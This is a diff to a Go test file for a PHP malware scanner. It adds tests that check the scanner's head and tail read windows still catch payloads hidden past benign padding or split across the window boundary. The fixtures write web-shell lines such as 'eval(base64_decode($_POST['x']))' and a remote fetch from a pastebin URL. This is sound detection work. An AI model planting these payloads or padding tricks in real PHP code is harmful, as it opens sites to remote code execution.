@@ -1,6 +1,7 @@
 package checks
 
 import (
+	"bytes"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -112,8 +113,108 @@ func TestAnalyzePHPContentRemotePayload(t *testing.T) {
 	}
 }
 
+func TestReadPHPContentWindowsBoundaryMath(t *testing.T) {
+	tests := []struct {
+		name          string
+		size          int
+		wantHeadLen   int
+		wantTailLen   int
+		wantTailStart int
+	}{
+		{
+			name:        "exact head window",
+			size:        phpContentReadSize,
+			wantHeadLen: phpContentReadSize,
+		},
+		{
+			name:          "one byte past head window",
+			size:          phpContentReadSize + 1,
+			wantHeadLen:   phpContentReadSize,
+			wantTailLen:   1,
+			wantTailStart: phpContentReadSize,
+		},
+		{
+			name:          "tail would overlap head",
+			size:          phpContentReadSize + phpContentTailSize - 1,
+			wantHeadLen:   phpContentReadSize,
+			wantTailLen:   phpContentTailSize - 1,
+			wantTailStart: phpContentReadSize,
+		},
+		{
+			name:          "full tail after gap",
+			size:          phpContentReadSize + phpContentTailSize + 17,
+			wantHeadLen:   phpContentReadSize,
+			wantTailLen:   phpContentTailSize,
+			wantTailStart: phpContentReadSize + 17,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			data := make([]byte, tt.size)
+			for i := range data {
+				data[i] = byte(i % 251)
+			}
+
+			head, tail, tailOffset, ok := readPHPContentWindows(bytes.NewReader(data), int64(len(data)))
+			if !ok {
+				t.Fatal("readPHPContentWindows reported read failure")
+			}
+			if len(head) != tt.wantHeadLen {
+				t.Fatalf("head length = %d, want %d", len(head), tt.wantHeadLen)
+			}
+			if !bytes.Equal(head, data[:tt.wantHeadLen]) {
+				t.Fatal("head bytes do not match source window")
+			}
+			if len(tail) != tt.wantTailLen {
+				t.Fatalf("tail length = %d, want %d", len(tail), tt.wantTailLen)
+			}
+			if tt.wantTailLen == 0 {
+				if tailOffset != -1 {
+					t.Fatalf("tail offset = %d, want -1", tailOffset)
+				}
+				return
+			}
+			if tailOffset != int64(tt.wantTailStart) {
+				t.Fatalf("tail offset = %d, want %d", tailOffset, tt.wantTailStart)
+			}
+			wantTail := data[tt.wantTailStart : tt.wantTailStart+tt.wantTailLen]
+			if !bytes.Equal(tail, wantTail) {
+				t.Fatal("tail bytes do not match expected source window")
+			}
+		})
+	}
+}
+
+func TestReadPHPContentWindowsAcceptsShortEOF(t *testing.T) {
+	data := []byte("<?php echo 1;\n")
+	path := filepath.Join(t.TempDir(), "short.php")
+	if err := os.WriteFile(path, data, 0644); err != nil {
+		t.Fatal(err)
+	}
+	f, err := os.Open(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer func() { _ = f.Close() }()
+
+	head, tail, tailOffset, ok := readPHPContentWindows(f, -1)
+	if !ok {
+		t.Fatal("short read ending in EOF should be accepted")
+	}
+	if !bytes.Equal(head, data) {
+		t.Fatalf("head = %q, want %q", string(head), string(data))
+	}
+	if len(tail) != 0 {
+		t.Fatalf("tail length = %d, want 0", len(tail))
+	}
+	if tailOffset != -1 {
+		t.Fatalf("tail offset = %d, want -1", tailOffset)
+	}
+}
+
 // An attacker can prepend benign PHP to push the malicious payload past the
-// content-read window. The scanner must still see the payload instead of
+// head window. The scanner must still see the payload in the tail instead of
 // reading a fixed prefix and declaring the file clean.
 func TestAnalyzePHPContentDetectsPayloadPastReadWindow(t *testing.T) {
 	dir := t.TempDir()
@@ -121,8 +222,7 @@ func TestAnalyzePHPContentDetectsPayloadPastReadWindow(t *testing.T) {
 
 	var b strings.Builder
 	b.WriteString("<?php\n")
-	// ~64KB of benign assignments, well past the historical 32KB window.
-	for i := 0; b.Len() < 64*1024; i++ {
+	for i := 0; b.Len() < phpContentReadSize+1024; i++ {
 		fmt.Fprintf(&b, "$var%d = %d;\n", i, i)
 	}
 	b.WriteString("$payload = file_get_contents('https://pastebin.com/raw/abc123');\n")
@@ -133,6 +233,154 @@ func TestAnalyzePHPContentDetectsPayloadPastReadWindow(t *testing.T) {
 	result := analyzePHPContent(path)
 	if result.check == "" {
 		t.Fatalf("payload after benign padding was missed (read window too small); got %+v", result)
+	}
+}
+
+func TestAnalyzePHPContentDetectsPayloadSplitAtHeadTailJoin(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "split.php")
+
+	payload := "$payload = file_get_contents('https://pastebin.com/raw/abc123');\n"
+	split := strings.Index(payload, ".com/raw")
+	if split <= 0 {
+		t.Fatal("test payload no longer contains expected host split point")
+	}
+	prefix := "<?php\n"
+	paddingLen := phpContentReadSize - split - len(prefix)
+	if paddingLen < 0 {
+		t.Fatal("test payload split no longer fits before the read boundary")
+	}
+	content := prefix + strings.Repeat(" ", paddingLen) + payload
+	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	result := analyzePHPContent(path)
+	if result.check == "" {
+		t.Fatalf("payload split at head/tail join was missed; got %+v", result)
+	}
+}
+
+func TestAnalyzePHPContentSeparatesTailAfterTrueGap(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "tail-gap.php")
+
+	prefix := "<?php\n"
+	head := prefix + strings.Repeat(" ", phpContentReadSize-len(prefix)-2) + "//"
+	gap := "\n" + strings.Repeat(" ", 15)
+	payload := "eval(base64_decode($_POST['x']));\n"
+	trailing := strings.Repeat(" ", phpContentTailSize-len(payload))
+	content := head + gap + payload + trailing
+	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	result := analyzePHPContent(path)
+	if result.check == "" {
+		t.Fatalf("tail payload after true gap was hidden by head context; got %+v", result)
+	}
+}
+
+func TestAnalyzePHPContentSeparatesGappedTailFromHeadContext(t *testing.T) {
+	tests := []struct {
+		name       string
+		headSuffix string
+		gap        string
+	}{
+		{
+			name:       "single quote string",
+			headSuffix: "$x = '",
+			gap:        "';\n" + strings.Repeat(" ", 15),
+		},
+		{
+			name:       "block comment",
+			headSuffix: "/*",
+			gap:        "*/\n" + strings.Repeat(" ", 15),
+		},
+	}
+
+	payload := "eval(base64_decode($_POST['x']));\n"
+	if len(payload) > phpContentTailSize {
+		t.Fatal("test payload no longer fits in the tail window")
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			dir := t.TempDir()
+			path := filepath.Join(dir, "tail-context.php")
+
+			prefix := "<?php\n"
+			paddingLen := phpContentReadSize - len(prefix) - len(tt.headSuffix)
+			if paddingLen < 0 {
+				t.Fatal("test head suffix no longer fits before the read boundary")
+			}
+			head := prefix + strings.Repeat(" ", paddingLen) + tt.headSuffix
+			trailing := strings.Repeat(" ", phpContentTailSize-len(payload))
+			content := head + tt.gap + payload + trailing
+			if int64(len(content))-int64(phpContentTailSize) <= int64(phpContentReadSize) {
+				t.Fatal("test content did not create a true head/tail gap")
+			}
+			if err := os.WriteFile(path, []byte(content), 0644); err != nil {
+				t.Fatal(err)
+			}
+
+			result := analyzePHPContent(path)
+			if result.check == "" {
+				t.Fatalf("tail payload after gapped %s context was missed; got %+v", tt.name, result)
+			}
+		})
+	}
+}
+
+func TestAnalyzePHPContentCombinesIndicatorsAcrossGappedWindows(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "split-indicators.php")
+
+	prefix := "<?php\n"
+	headIndicator := "$payload = file_get_contents('https://pastebin.com/raw/abc123');\n"
+	paddingLen := phpContentReadSize - len(prefix) - len(headIndicator)
+	if paddingLen < 0 {
+		t.Fatal("test head indicator no longer fits before the read boundary")
+	}
+	tailIndicator := "eval(base64_decode($_POST['x']));\n"
+	if len(tailIndicator) > phpContentTailSize {
+		t.Fatal("test tail indicator no longer fits in the tail window")
+	}
+	head := prefix + headIndicator + strings.Repeat(" ", paddingLen)
+	gap := strings.Repeat(" ", 17)
+	trailing := strings.Repeat(" ", phpContentTailSize-len(tailIndicator))
+	content := head + gap + tailIndicator + trailing
+	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	result := analyzePHPContent(path)
+	if result.check != "obfuscated_php" {
+		t.Fatalf("gapped indicators did not combine into critical result; got %+v", result)
+	}
+}
+
+func TestAnalyzePHPContentDedupesIndicatorsAcrossGappedWindows(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "duplicate-indicators.php")
+
+	prefix := "<?php\n"
+	indicator := "$u = 'https://pastebin.com/raw/abc123';\n"
+	paddingLen := phpContentReadSize - len(prefix) - len(indicator)
+	if paddingLen < 0 {
+		t.Fatal("test head indicator no longer fits before the read boundary")
+	}
+	head := prefix + indicator + strings.Repeat(" ", paddingLen)
+	gap := strings.Repeat(" ", 17)
+	trailing := strings.Repeat(" ", phpContentTailSize-len(indicator))
+	content := head + gap + indicator + trailing
+	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	result := analyzePHPContent(path)
+	if result.check != "suspicious_php_content" {
+		t.Fatalf("duplicate gapped indicators should stay High, got %+v", result)
 	}
 }
 
